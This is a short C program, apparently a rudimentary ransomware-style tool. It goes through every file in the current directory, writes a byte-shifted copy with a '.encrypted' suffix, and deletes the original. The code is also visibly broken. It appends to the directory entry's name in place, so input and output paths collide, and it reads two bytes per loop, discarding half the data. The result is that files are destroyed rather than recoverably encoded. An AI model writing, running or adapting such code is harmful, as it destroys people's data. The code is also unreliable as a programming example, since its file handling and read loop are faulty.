#include <dirent.h>
#include <stdio.h>
#include <string.h>

void main()
{
    DIR *d;
    struct dirent *dir;
    FILE *inFile;  //Declare inFile
    FILE *outFile; //Declare outFile
    char Byte;
    char newByte;
    int n;
    int i = 0;

    d = opendir(".");
    if (d)
    {
        // For each founded file
        while ((dir = readdir(d)) != NULL)
        {
            printf("%s\n", dir->d_name);

            char *newFileName = dir->d_name;
            strcat(newFileName, ".encrypted");

            inFile = fopen(dir->d_name, "rb");

            outFile = fopen(newFileName, "wb");

            if (inFile == NULL || outFile == NULL)
            {
            }
            else
            {
                //File Opened, Encrypting
                while (1)
                {
                    while ((Byte = getc(inFile)) != EOF)
                    {
                        Byte = fgetc(inFile);
                        newByte = Byte + 100;
                        fputc(newByte, outFile);
                    }
                    // End of File
                    break;
                }
                fclose(inFile);
                fclose(outFile);
                // Remove original file
                remove(dir->d_name);
            }
        }
        closedir(d);
    }
}